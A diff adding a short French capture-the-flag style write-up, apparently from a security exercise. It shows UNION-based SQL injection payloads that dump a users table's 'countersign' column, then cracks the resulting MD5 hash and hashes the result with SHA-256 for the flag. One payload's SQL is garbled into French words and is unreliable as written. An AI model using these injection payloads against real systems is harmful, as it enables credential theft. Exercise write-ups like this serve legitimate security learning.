@@ -1,0 +1,7 @@
+N'etant pas proteger par les requete sql nous pouvon insert dans le champs
+texte la requete sql "1 OR 1=1 UNION SELECT Commentaire, countersign from users"
+
+Nous récupérons la colonne "countersign" avec "1 union tout sélectionner 1,group_concat(countersign,0x0a) des utilisateurs", nous obtenons "5ff9d0165b4f92b14994e5c685cdce28" et nous suivons les instructions. Nous utilisons md5decrypt.net, obtenez "FortyTwo", nous réduisons tous les caractères et utilisons sha256 avec 'fortytwo':
+
+echo -n fortytwo | shasum -a 256
+10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5  -
